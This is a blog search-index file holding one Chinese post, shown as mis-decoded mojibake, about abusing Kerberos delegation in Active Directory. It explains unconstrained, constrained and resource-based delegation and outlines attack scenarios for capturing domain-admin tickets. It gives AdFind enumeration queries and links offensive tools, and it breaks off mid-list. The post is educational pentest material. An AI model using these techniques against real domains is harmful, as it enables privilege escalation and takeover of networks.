<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>å§”æ´¾</title>
      <link href="/2025/03/16/%E5%9F%9F/%E5%A7%94%E6%B4%BE/"/>
      <url>/2025/03/16/%E5%9F%9F/%E5%A7%94%E6%B4%BE/</url>
      
        <content type="html"><![CDATA[<h2 id="å§”æ´¾å®‰å…¨çŸ¥è¯†ç‚¹"><a href="#å§”æ´¾å®‰å…¨çŸ¥è¯†ç‚¹" class="headerlink" title="å§”æ´¾å®‰å…¨çŸ¥è¯†ç‚¹"></a>å§”æ´¾å®‰å…¨çŸ¥è¯†ç‚¹</h2><p>å§”æ´¾æ˜¯ä¸€ç§åŸŸå†…åº”ç”¨æ¨¡å¼ï¼Œæ˜¯æŒ‡å°†åŸŸå†…ç”¨æˆ·è´¦æˆ·çš„æƒé™å§”æ´¾ç»™æœåŠ¡è´¦å·ï¼ŒæœåŠ¡è´¦å·å› æ­¤èƒ½ä»¥ç”¨æˆ·çš„èº«ä»½åœ¨åŸŸå†…å±•å¼€æ´»åŠ¨ï¼ˆè¯·æ±‚æ–°çš„æœåŠ¡ç­‰ï¼‰ï¼Œç±»ä¼¼äºç§Ÿæˆ¿ä¸­ä»‹æˆ¿ä¸œçš„å…³ç³»å»ç†è§£ã€‚</p><h2 id="åŸŸå§”æ´¾åˆ†ç±»ï¼š"><a href="#åŸŸå§”æ´¾åˆ†ç±»ï¼š" class="headerlink" title="åŸŸå§”æ´¾åˆ†ç±»ï¼š"></a>åŸŸå§”æ´¾åˆ†ç±»ï¼š</h2><p>1ã€éçº¦æŸå§”æ´¾(Unconstrained Delegation, UD)</p><p>2ã€çº¦æŸå§”æ´¾(Constrained Delegation, CD)</p><p>3ã€åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾(Resource Based Constrained Delegation, RBCD)</p><p>ç®€è€Œè¨€ä¹‹ï¼Œéçº¦æŸå§”æ´¾æ˜¯æŒ‡ç”¨æˆ·è´¦æˆ·å°†è‡ªèº«çš„TGTè½¬å‘ç»™æœåŠ¡è´¦æˆ·ä½¿ç”¨ã€‚çº¦æŸå§”æ´¾é€šè¿‡S4U2Selfå’ŒS4U2Proxyä¸¤ä¸ªæ‰©å±•åè®®é™åˆ¶æœåŠ¡è´¦æˆ·åªèƒ½è®¿é—®æŒ‡å®šæœåŠ¡èµ„æºã€‚</p><p>RBCDä¸»è¦å°±æ˜¯å§”æ´¾çš„ç®¡ç†ç§»äº¤ç»™æœåŠ¡èµ„æºè¿›è¡Œæ§åˆ¶ï¼Œå…¶ä½™å’Œçº¦æŸæ€§å§”æ´¾åŸºæœ¬ç›¸åŒã€‚</p><p>è´¦æˆ·åˆ†ç±»ï¼š</p><p>æœºå™¨è´¦æˆ·ï¼šè®¡ç®—æœºæœ¬èº«åç§°çš„è´¦æˆ·ï¼Œåœ¨åŸŸä¸­computersç»„å†…çš„è®¡ç®—æœºã€‚</p><p>ä¸»æœºè´¦æˆ·ï¼šè®¡ç®—æœºç³»ç»Ÿçš„ä¸»æœºè´¦æˆ·ï¼Œç”¨äºæ­£å¸¸ç”¨æˆ·ç™»å…¥è®¡ç®—æœºä½¿ç”¨ã€‚</p><p>æœåŠ¡è´¦æˆ·ï¼šè®¡ç®—æœºæœåŠ¡å®‰è£…æ—¶åˆ›å»ºçš„è´¦æˆ·ï¼Œç”¨äºè¿è¡ŒæœåŠ¡æ—¶ä½¿ç”¨ï¼Œä¸å¯ç”¨äºç™»å…¥è®¡ç®—æœºã€‚</p><p>æ¶‰åŠé¡¹ç›®:</p><p><a href="https://github.com/shanfenglan/test/tree/master/spooler">https://github.com/shanfenglan/test/tree/master/spooler</a></p><p><a href="https://github.com/fortra/impacket%EF%BC%88%E7%BB%BC%E5%90%88%E5%88%A9%E7%94%A8%EF%BC%89">https://github.com/fortra/impacketï¼ˆç»¼åˆåˆ©ç”¨ï¼‰</a></p><p><a href="https://github.com/gentilkiwi/kekeo%EF%BC%88%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8%EF%BC%89">https://github.com/gentilkiwi/kekeoï¼ˆç¥¨æ®åˆ©ç”¨ï¼‰</a></p><p><a href="https://github.com/topotam/PetitPotam%EF%BC%88%E7%BB%93%E5%90%88ntlm%E9%87%8D%E6%94%BE%EF%BC%89">https://github.com/topotam/PetitPotamï¼ˆç»“åˆntlmé‡æ”¾ï¼‰</a></p><p><a href="https://github.com/leechristensen/SpoolSample%EF%BC%88%E6%89%93%E5%8D%B0%E6%9C%BA%E5%88%A9%E7%94%A8%EF%BC%89">https://github.com/leechristensen/SpoolSampleï¼ˆæ‰“å°æœºåˆ©ç”¨ï¼‰</a></p><p><a href="https://www.joeware.net/freetools/tools/adfind/(%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86)">https://www.joeware.net/freetools/tools/adfind/(ä¿¡æ¯æ”¶é›†)</a></p><p>å‚è€ƒæ–‡ç« ï¼š</p><p><a href="https://forum.butian.net/share/1591">https://forum.butian.net/share/1591</a></p><p><a href="https://www.cnblogs.com/sup3rman/p/16088447.html">https://www.cnblogs.com/sup3rman/p/16088447.html</a></p><p><a href="https://mp.weixin.qq.com/s/0UOOMF5s00D-y3fojVKMdA">https://mp.weixin.qq.com/s/0UOOMF5s00D-y3fojVKMdA</a></p><h2 id="éçº¦æŸå§”æ´¾"><a href="#éçº¦æŸå§”æ´¾" class="headerlink" title="éçº¦æŸå§”æ´¾"></a>éçº¦æŸå§”æ´¾</h2><h3 id="æµç¨‹"><a href="#æµç¨‹" class="headerlink" title="æµç¨‹"></a>æµç¨‹</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742997871349-02ffc29c-61f3-4562-ada1-afefee98b189.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">å…·ä½“è®¤è¯æµç¨‹ï¼š</span><br><span class="line">1ã€ç”¨æˆ·æœºå™¨å‘KDCè¯·æ±‚å¯è½¬å‘çš„TGT1</span><br><span class="line">2ã€KDCåœ¨æ¶ˆæ¯ä¸­ç»™è¿”å›TGT1ï¼ˆè®¿é—®æœåŠ¡1ä½¿ç”¨ï¼‰</span><br><span class="line">3ã€ç”¨æˆ·é€šè¿‡TGT1è¯·æ±‚è½¬å‘TGT2ï¼ˆè®¿é—®æœåŠ¡2ä½¿ç”¨ï¼‰</span><br><span class="line">4ã€KDCè¿”å›æ¶ˆæ¯TGT2</span><br><span class="line">5ã€ç”¨æˆ·ä½¿ç”¨TGT1å‘KDCç”³è¯·è®¿é—®æœåŠ¡1</span><br><span class="line">6ã€TGS è¿”å› ST ç»™ç”¨æˆ·</span><br><span class="line">7ã€ç”¨æˆ·å‘é€AP_REQè¯·æ±‚æœåŠ¡1ï¼ŒåŒ…å«äº†TGT1ã€TGT2ã€TGT2çš„sessionkey</span><br><span class="line">8ã€æœåŠ¡1ä½¿ç”¨ç”¨æˆ·å‘é€è¿‡æ¥çš„TGT2å»è¯·æ±‚KDCï¼Œå¹¶ä»¥ç”¨æˆ·çš„èº«ä»½è¯·æ±‚æœåŠ¡2çš„ST</span><br><span class="line">9ã€KDCè¿”å›æœåŠ¡2çš„STç»™æœåŠ¡1ï¼ˆè¿™é‡ŒSTå°†æ¥æºè¯·æ±‚æ ‡è®°ä¸ºç”¨æˆ·æœºå™¨ï¼Œè€Œä¸æ˜¯æœåŠ¡1ï¼‰</span><br><span class="line">10ã€æœåŠ¡1ä»¥ç”¨æˆ·çš„åä¹‰è¯·æ±‚æœåŠ¡2</span><br><span class="line">11ã€æœåŠ¡2å›åº”æœåŠ¡1è¯·æ±‚</span><br><span class="line">12ã€æœåŠ¡1å›åº”ç”¨æˆ·æœºå™¨è¯·æ±‚</span><br><span class="line">13ã€æœåŠ¡1èƒ½å¤Ÿå‘KDCè¯·æ±‚å…¶ä»–æœåŠ¡ST</span><br><span class="line">14ã€KDCè¿”å›å…¶ä»–æœåŠ¡ST</span><br><span class="line">15ã€æœåŠ¡1ä»¥ç”¨æˆ·åä¹‰è¯·æ±‚å…¶ä»–æœåŠ¡</span><br><span class="line">16ã€å…¶ä»–æœåŠ¡å›åº”æœåŠ¡1</span><br></pre></td></tr></table></figure><p>åŸç†ï¼š</p><p>æœºå™¨Aï¼ˆåŸŸæ§ï¼‰è®¿é—®å…·æœ‰éçº¦æŸå§”æ´¾æƒé™çš„æœºå™¨Bçš„æœåŠ¡ï¼Œä¼šæŠŠå½“å‰è®¤è¯ç”¨æˆ·ï¼ˆåŸŸç®¡ç”¨æˆ·ï¼‰çš„çš„TGTæ”¾åœ¨STç¥¨æ®ä¸­ï¼Œä¸€èµ·å‘é€ç»™æœºå™¨Bï¼Œæœºå™¨Bä¼šæŠŠTGTå­˜å‚¨åœ¨lsassè¿›ç¨‹ä¸­ä»¥å¤‡ä¸‹æ¬¡é‡ç”¨ã€‚ä»è€Œæœºå™¨Bå°±èƒ½ä½¿ç”¨è¿™ä¸ªTGTæ¨¡æ‹Ÿè®¤è¯ç”¨æˆ·ï¼ˆåŸŸç®¡ç”¨æˆ·ï¼‰è®¿é—®æœåŠ¡ã€‚</p><p>åˆ©ç”¨åœºæ™¯</p><p>æ”»å‡»è€…æ‹¿åˆ°äº†ä¸€å°é…ç½®éçº¦æŸå§”æ´¾çš„æœºå™¨æƒé™ï¼Œå¯ä»¥è¯±å¯¼åŸŸç®¡æ¥è®¿é—®è¯¥æœºå™¨ï¼Œç„¶åå¾—åˆ°ç®¡ç†å‘˜çš„TGTï¼Œä»è€Œæ¨¡æ‹ŸåŸŸç®¡ç”¨æˆ·ã€‚</p><p>å¤ç°é…ç½®ï¼š</p><p>å‚è€ƒï¼š<a href="https://developer.aliyun.com/article/1228233">https://developer.aliyun.com/article/1228233</a></p><p>1ã€ä¿¡ä»»æ­¤è®¡ç®—æœºæ¥å§”æ´¾ä»»ä½•æœåŠ¡</p><p>2ã€setspn -U -A MSSQLSvc&#x2F;mssql.hack.com:1433 test2</p><p>å¼€å¯æœåŠ¡è´¦å·test2çš„å§”æ´¾è®¾ç½®ï¼š</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742998178852-e76c4a8a-d6b7-48ca-ac85-2858cf450339.png"></p><p>è®¾ç½®æœºå™¨è´¦å·ä¸ºå§”æ´¾ï¼š</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742998186515-f20ecda0-fe96-4b0a-80bc-ee6da52b958a.png"></p><p><strong>æ³¨æ„ï¼š</strong>åªæœ‰æœåŠ¡è´¦å·å’Œä¸»æœºè´¦å·èƒ½è®¾ç½®å§”æ´¾</p><p>å½“è®¾ç½®æˆåŠŸåï¼Œè´¦å·çš„userAccountControlå±æ€§ä¼šåŒ…å«TRUSTED_FOR_DELEGATION</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742998198922-ab48c74a-38d7-4647-9e44-1d251d31dd50.png"></p><p>åˆ¤æ–­æŸ¥è¯¢ï¼š</p><p>æŸ¥è¯¢åŸŸå†…è®¾ç½®äº†éçº¦æŸå§”æ´¾çš„æœåŠ¡è´¦æˆ·ï¼š</p><p>AdFind -b â€œDC&#x3D;god,DC&#x3D;orgâ€ -f â€œ(&amp;(samAccountType&#x3D;805306368)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))â€ dn</p><p>æŸ¥è¯¢åŸŸå†…è®¾ç½®äº†éçº¦æŸå§”æ´¾çš„æœºå™¨è´¦æˆ·:</p><p>AdFind -b â€œDC&#x3D;god,DC&#x3D;orgâ€ -f â€œ(&amp;(samAccountType&#x3D;805306369)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))â€ dn</p><p>åˆ©ç”¨æ€è·¯1ï¼šè¯±ä½¿åŸŸç®¡ç†å‘˜è®¿é—®æœºå™¨</p><h3 id="åˆ©ç”¨æ¡ä»¶ï¼š"><a href="#åˆ©ç”¨æ¡ä»¶ï¼š" class="headerlink" title="åˆ©ç”¨æ¡ä»¶ï¼š"></a>åˆ©ç”¨æ¡ä»¶ï¼š</h3><p>1ã€éœ€è¦Administratoræƒé™</p><p>2ã€åŸŸå†…ä¸»æœºçš„æœºå™¨è´¦æˆ·å¼€å¯éçº¦æŸå§”æ´¾</p><p>3ã€åŸŸæ§ç®¡ç†å‘˜è¿œç¨‹è®¿é—®ï¼ˆä¸»åŠ¨æˆ–è¢«åŠ¨ï¼‰</p><p>åˆ©ç”¨è¿‡ç¨‹ï¼šå‚è€ƒ<a href="https://forum.butian.net/share/1591">https://forum.butian.net/share/1591</a></p><h2 id="çº¦æŸå§”æ´¾"><a href="#çº¦æŸå§”æ´¾" class="headerlink" title="çº¦æŸå§”æ´¾"></a>çº¦æŸå§”æ´¾</h2><p>åŸç†ï¼š</p><p>ç”±äºéçº¦æŸå§”æ´¾çš„ä¸å®‰å…¨æ€§ï¼Œå¾®è½¯åœ¨windows server 2003ä¸­å¼•å…¥äº†çº¦æŸå§”æ´¾ï¼Œå¯¹Kerberosåè®®è¿›è¡Œäº†æ‹“å±•ï¼Œå¼•å…¥äº†SService for User to Self (S4U2Self)å’Œ Service for User to Proxy (S4U2proxy)ã€‚</p><p><strong>S4U2selfï¼š</strong></p><p>å½“æœåŠ¡è´¦æˆ·å¼€å¯äº†çº¦æŸæ€§å§”æ´¾æ—¶ï¼Œé‚£ä¹ˆè¯¥æœåŠ¡å°±å¯ä»¥ä»£è¡¨è®¿é—®åˆ°è¯¥æœåŠ¡çš„ç”¨æˆ·è¯·æ±‚<strong>é’ˆå¯¹å…¶è‡ªèº«çš„</strong>æœåŠ¡ç¥¨æ®(ST)ï¼Œä¹Ÿå°±æ˜¯è¯´å½“user1è®¿é—®åˆ°äº†æœåŠ¡1ï¼ŒæœåŠ¡1ä»¥<strong>s4u2self</strong>çš„æ–¹å¼å‘KDCè¯·æ±‚ä¸€å¼ å¯ä»¥<strong>ä»¥user1èº«ä»½</strong>è®¿é—®è‡ªèº«æœåŠ¡1çš„ã€<strong>å¯ç”¨äºè½¬å‘</strong>çš„ç¥¨æ®ï¼Œå®é™…è¿˜æ˜¯è®¿é—®çš„æœåŠ¡1ï¼Œä½†æ˜¯å€ŸåŠ©äº†user1çš„èº«ä»½ï¼Œç›®çš„å°±æ˜¯æ‹¿åˆ°user1çš„æˆæƒæ•°æ®ï¼Œå¦‚æœuser1æ˜¯ä»¥å…¶ä»–è®¤è¯æ–¹å¼å¯¹æœåŠ¡1è¿›è¡Œè®¤è¯çš„ï¼ˆwebã€ntlmç­‰ï¼‰ï¼Œæ˜¯è·å–ä¸åˆ°è®¿é—®æœåŠ¡1è‡ªèº«çš„stç¥¨æ®çš„ï¼Œæ‰€ä»¥s4u2selfå°±æ˜¯ç”¨æ¥è§£å†³è¿™ä¸ªé—®é¢˜çš„ã€‚</p><p><strong>S4U2proxyï¼š</strong></p><p>æœåŠ¡1å¯ä»¥ä»¥ç”¨æˆ·çš„åä¹‰è¯·æ±‚å…¶å®ƒæœåŠ¡çš„STï¼Œå’Œselfæœ€å¤§çš„åŒºåˆ«å°±æ˜¯selfæ˜¯è¯·æ±‚è‡ªèº«æœåŠ¡ï¼Œå½“éœ€è¦ä»¥user1çš„èº«ä»½è®¿é—®å…¶ä»–æœåŠ¡ï¼Œå°±éœ€è¦<strong>s4u2proxy</strong>ä¸Šåœºäº†ï¼Œè€Œçº¦æŸå§”æ´¾å°±æ˜¯é™åˆ¶äº†S4U2proxyæ‰©å±•çš„è®¿é—®èŒƒå›´</p><h3 id="æµç¨‹-1"><a href="#æµç¨‹-1" class="headerlink" title="æµç¨‹"></a>æµç¨‹</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742998936926-dea664a1-463a-4462-8ea6-abc7d1a3b853.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ï¼ˆ1ï¼‰ç”¨æˆ·å‘ Service1 å‘å‡ºè¯·æ±‚ï¼Œç”¨æˆ·å·²é€šè¿‡èº«ä»½éªŒè¯ï¼Œä½† Service1 æ²¡æœ‰ç”¨æˆ·çš„æˆæƒæ•°æ®ï¼Œè¿™é€šå¸¸æ˜¯ç”±äºç”¨æˆ·çš„èº«ä»½éªŒè¯æ˜¯é€šè¿‡ Kerberos ä»¥å¤–(åŸºäºè¡¨å•çš„ web è®¤è¯ã€NTLM è®¤è¯ç­‰)çš„å…¶ä»–æ–¹å¼éªŒè¯çš„ã€‚</span><br><span class="line">ï¼ˆ2ï¼‰Service1 å·²ç»é€šè¿‡ KDC è¿›è¡Œäº†èº«ä»½éªŒè¯ï¼Œå¹¶è·å¾—äº† TGT è®¤è´­æƒè¯ã€‚å®ƒé€šè¿‡S4U2self åè®®ä»£è¡¨ç”¨æˆ·å‘ KDC è¯·æ±‚ä¸€å¼ è®¿é—®è‡ªèº« Service1 æœåŠ¡çš„å¯è½¬å‘ ST æœåŠ¡ç¥¨æ®ã€‚</span><br><span class="line">ï¼ˆ3ï¼‰KDC è¿”å›ç»™ Service1 ä¸€å¼ è®¿é—® Service1 è‡ªèº«æœåŠ¡çš„å¯è½¬å‘ ST1 æœåŠ¡ç¥¨æ®ï¼Œå°±åƒæ˜¯ç”¨æˆ·ä½¿ç”¨è‡ªå·±çš„ TGT è®¤è´­æƒè¯è¯·æ±‚çš„ä¸€æ ·ï¼Œè¯¥å¯è½¬å‘çš„ ST1 æœåŠ¡ç¥¨æ®å¯èƒ½åŒ…å«ç”¨æˆ·çš„æˆæƒæ•°æ®ã€‚</span><br><span class="line">ï¼ˆ4ï¼‰Service1 å¯ä»¥ä½¿ç”¨ ST1 æœåŠ¡ç¥¨æ®ä¸­çš„æˆæƒæ•°æ®æ¥æ»¡è¶³ç”¨æˆ·çš„è¯·æ±‚ï¼Œç„¶åå“åº”ç”¨æˆ·ã€‚</span><br><span class="line">ï¼ˆ5ï¼‰ç”¨æˆ·å‘ Service1 å‘å‡ºè¯·æ±‚ï¼Œè¯·æ±‚è®¿é—® Service2 ä¸Šçš„èµ„æºã€‚</span><br><span class="line">ï¼ˆ6ï¼‰Service1 åˆ©ç”¨ S4U4Proxy åè®®ä»¥ç”¨æˆ·çš„åä¹‰å‘ KDC è¯·æ±‚è®¿é—® Service2 çš„ST2 æœåŠ¡ç¥¨æ®ï¼Œè¯¥è¯·æ±‚ä¸­å¸¦ä¸Šäº†å¯è½¬å‘çš„ ST1 æœåŠ¡ç¥¨æ®</span><br><span class="line">ï¼ˆ7ï¼‰å¦‚æœè¯·æ±‚ä¸­å­˜åœ¨ PAC ç‰¹æƒå±æ€§è¯ä¹¦ï¼Œåˆ™ KDC é€šè¿‡æ£€æŸ¥ PAC ç»“æ„çš„ç­¾åæ•°æ®æ¥éªŒè¯ PACã€‚å¦‚æœ PAC æœ‰æ•ˆæˆ–ä¸å­˜åœ¨ï¼ŒKDC è¿”å› Service2 çš„å¯è½¬å‘ ST2 æœåŠ¡ç¥¨æ®ï¼Œå¹¶ä¸”å­˜å‚¨åœ¨ ST2 æœåŠ¡ç¥¨æ®ä¸­çš„ cname å’Œ crealm å­—æ®µä¸­çš„å®¢æˆ·ç«¯æ ‡è¯†æ˜¯ç”¨æˆ·ï¼Œè€Œä¸æ˜¯ Service1ã€‚</span><br><span class="line">ï¼ˆ8ï¼‰Service1 ä»¥ç”¨æˆ·èº«ä»½ä½¿ç”¨å¯è½¬å‘ ST2 æœåŠ¡ç¥¨æ®å‘ Service2 å‘èµ·è¯·æ±‚ã€‚</span><br><span class="line">ï¼ˆ9ï¼‰Service2 å“åº”æ­¥éª¤ 8 çš„è¯·æ±‚ã€‚</span><br><span class="line">ï¼ˆ10ï¼‰Service1 å“åº”ç”¨æˆ·å¯¹æ­¥éª¤ 5 ä¸­çš„è¯·æ±‚ã€‚</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨åœºæ™¯ï¼š</p><p>å¦‚æœæ”»å‡»è€…æ§åˆ¶äº†æœåŠ¡Açš„è´¦å·ï¼Œå¹¶ä¸”æœåŠ¡Aé…ç½®äº†åˆ°åŸŸæ§çš„CIFSæœåŠ¡çš„çº¦æŸæ€§å§”æ´¾ã€‚</p><p>åˆ™æ”»å‡»è€…å¯ä»¥å…ˆä½¿ç”¨S4u2sefltç”³è¯·åŸŸç®¡ç”¨æˆ·ï¼ˆadministratorï¼‰è®¿é—®AæœåŠ¡çš„ST1ï¼Œç„¶åä½¿ç”¨S4u2Proxyä»¥administratorèº«ä»½è®¿é—®åŸŸæ§çš„CIFSæœåŠ¡ï¼Œå³ç›¸å½“äºæ§åˆ¶äº†åŸŸæ§ã€‚</p><p>å¤ç°é…ç½®ï¼šå‚è€ƒ<a href="https://developer.aliyun.com/article/1228237?spm=a2c6h.24874632.expert-profile.7.2fe45662aTMdZv">https://developer.aliyun.com/article/1228237?spm=a2c6h.24874632.expert-profile.7.2fe45662aTMdZv</a></p><p>1ã€æœºå™¨è®¾ç½®ä»…ä¿¡ä»»æ­¤è®¡ç®—æœºæŒ‡å®šæœåŠ¡-cifs</p><p>2ã€ç”¨æˆ·è®¾ç½®ä»…ä¿¡ä»»æ­¤è®¡ç®—æœºæŒ‡å®šæœåŠ¡-cifs</p><p>é…ç½®æœåŠ¡è´¦æˆ·test2å¯¹åŸŸæ§æœºå™¨PANDAçš„ç‰¹å®šæœåŠ¡cifsçš„çº¦æŸæ€§å§”æ´¾</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742998784594-5266472d-648b-4e07-83f9-a39685a757dc.png"></p><p>ä¸è¿‡åœ¨å®é™…ç¯å¢ƒä¸­ï¼ŒåŸºæœ¬ä¸ä¼šæœ‰ä¼ä¸šä¼šè¿™ä¹ˆé…ç½®çš„ï¼Œæ‰€ä»¥çº¦æŸæ€§å§”æ´¾ç”¨çš„ä¹Ÿä¸æ˜¯å¾ˆå¤š</p><p>å½“æœåŠ¡è´¦å·æˆ–è€…ä¸»æœºè¢«è®¾ç½®ä¸ºçº¦æŸæ€§å§”æ´¾æ—¶ï¼Œå…¶userAccountControlå±æ€§ä¼šåŒ…å«TRUSTED_TO_AUTH_FOR_DELEGATION</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742998805101-338f8b9b-738e-4d89-bdd0-0ad2d3ccee4f.png"></p><p>è€Œä¸”msDS-AllowedToDelegateToå±æ€§ä¼šåŒ…å«è¢«çº¦æŸçš„ç‰¹å®šæœåŠ¡</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742998814023-301eeb35-5077-42f6-bac3-db827b9374e8.png"></p><p>åˆ©ç”¨æ€è·¯ï¼šä½¿ç”¨æœºå™¨è´¦æˆ·ç¥¨æ®</p><h3 id="åˆ©ç”¨æ¡ä»¶ï¼š-1"><a href="#åˆ©ç”¨æ¡ä»¶ï¼š-1" class="headerlink" title="åˆ©ç”¨æ¡ä»¶ï¼š"></a>åˆ©ç”¨æ¡ä»¶ï¼š</h3><p>kekeo Rubeus getST</p><p>1ã€éœ€è¦Administratoræƒé™</p><p>2ã€ç›®æ ‡æœºå™¨è´¦æˆ·é…ç½®äº†çº¦æŸæ€§å§”æ´¾</p><p>åˆ¤æ–­æŸ¥è¯¢ï¼š</p><p>æŸ¥è¯¢æœºå™¨ç”¨æˆ·ï¼ˆä¸»æœºï¼‰é…ç½®çº¦æŸå§”æ´¾</p><p>AdFind -b â€œDC&#x3D;god,DC&#x3D;orgâ€ -f â€œ(&amp;(samAccountType&#x3D;805306369)(msds-allowedtodelegateto&#x3D;*))â€ msds-allowedtodelegateto</p><p>æŸ¥è¯¢æœåŠ¡è´¦æˆ·ï¼ˆä¸»æœºï¼‰é…ç½®çº¦æŸå§”æ´¾</p><p>AdFind -b â€œDC&#x3D;god,DC&#x3D;orgâ€ -f â€œ(&amp;(samAccountType&#x3D;805306368)(msds-allowedtodelegateto&#x3D;*))â€ msds-allowedtodelegateto</p><p>kekeoåˆ©ç”¨æ­¥éª¤ï¼šå‚è€ƒ<a href="https://forum.butian.net/share/1591">https://forum.butian.net/share/1591</a></p><h2 id="åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾"><a href="#åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾" class="headerlink" title="åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾"></a>åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾</h2><p>åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾(RBCD)æ˜¯åœ¨Windows Server 2012ä¸­æ–°åŠ å…¥çš„åŠŸèƒ½ï¼Œä¸ä¼ ç»Ÿçš„çº¦æŸå§”æ´¾ç›¸æ¯”ï¼Œå®ƒä¸å†éœ€è¦åŸŸç®¡ç†å‘˜æƒé™å»è®¾ç½®ç›¸å…³å±æ€§ã€‚RBCDæŠŠè®¾ç½®å§”æ´¾çš„æƒé™èµ‹äºˆäº†æœºå™¨è‡ªèº«ï¼Œæ—¢æœºå™¨è‡ªå·±å¯ä»¥å†³å®šè°å¯ä»¥è¢«å§”æ´¾æ¥æ§åˆ¶æˆ‘ã€‚ä¹Ÿå°±æ˜¯è¯´æœºå™¨è‡ªèº«å¯ä»¥ç›´æ¥åœ¨è‡ªå·±è´¦æˆ·ä¸Šé…ç½®msDS-AllowedToActOnBehalfOfOtherIdentityå±æ€§æ¥è®¾ç½®RBCDã€‚</p><p>æ‰€ä»¥æ ¸å¿ƒå°±æ˜¯è°æˆ–ä»€ä¹ˆæƒé™èƒ½ä¿®æ”¹msDS-AllowedToActOnBehalfOfOtherIdentity</p><p>ç®€å•çš„è®²ï¼Œä¹Ÿå°±æ˜¯å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿåœ¨dataçš„æœºå™¨ä¸Šè®¾ç½®msDS-AllowedToActOnBehalfOfOtherIdentityå±æ€§ä¸ºServiceAï¼Œ</p><p>ä¹Ÿå°±å…è®¸ServiceAåˆ©ç”¨s4u2selfåè®®ä»£è¡¨å…¶ä»–ç”¨æˆ·èº«ä»½æ¥è®¿é—®dataçš„è¯ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥åšåˆ°æ¨ªå‘ç§»åŠ¨åŠææƒç­‰æ“ä½œã€‚</p><p>ä»¥ä¸‹è¿™äº›æ‹¥æœ‰é…ç½®<strong>msDS-AllowedToActOnBehalfOfOtherIdentity</strong>å±æ€§çš„æƒé™ï¼š1.å°†æŸæœºå™¨åŠ å…¥åŸŸçš„åŸŸç”¨æˆ·2.æœºå™¨è‡ªèº«3.åŸŸç®¡ç†å‘˜</p><h3 id="æµç¨‹-2"><a href="#æµç¨‹-2" class="headerlink" title="æµç¨‹"></a>æµç¨‹</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742999993490-1352de6f-4798-41ae-99cb-e29ee1457ccb.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1ï¼‰æœåŠ¡Aä½¿ç”¨è‡ªå·±çš„æœåŠ¡è´¦æˆ·å’Œå¯†ç å‘KDCç”³è¯·ä¸€ä¸ªå¯è½¬å‘çš„TGT</span><br><span class="line">2ï¼‰æœåŠ¡Aåˆ©ç”¨S4u2Selfåè®®ä»£è¡¨ç”¨æˆ·ç”³è¯·ä¸€ä¸ªè®¿é—®è‡ªèº«çš„STã€‚è¿™ä¸€æ­¥åŒºåˆ«äºä¼ ç»Ÿçš„çº¦æŸæ€§å§”æ´¾ã€‚åœ¨S4uSelfåè®®ä¸­æåˆ°ï¼Œè¿”å›çš„STå¯è½¬å‘çš„ä¸€ä¸ªæ¡ä»¶æ˜¯æœåŠ¡Aé…ç½®äº†ä¼ ç»Ÿçš„çº¦æŸæ€§å§”æ´¾ã€‚KDCä¼šæ£€æŸ¥æœåŠ¡Açš„msDS-AllowedToDelegateToå­—æ®µï¼Œå¦‚æœè¿™ä¸ªå­—æ®µè¢«èµ‹å€¼äº†ï¼Œåˆ™KDCè¿”å›å¯è½¬å‘çš„STã€‚ä½†æ˜¯ç”±äºè¿™é‡Œæ˜¯åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾ï¼Œæ˜¯åœ¨æœåŠ¡Bä¸Šé…ç½®çš„ï¼ŒæœåŠ¡Bçš„msDS-AllowedToActOnBehalfOfOtherIdentityå±æ€§é…ç½®äº†æœåŠ¡Açš„SIDï¼ŒæœåŠ¡Aå¹¶æ²¡æœ‰é…ç½®msDS-AllowedToDelegateToå­—æ®µï¼Œå› æ­¤KDCè¿”å›çš„STæ˜¯ä¸å¯è½¬å‘çš„</span><br><span 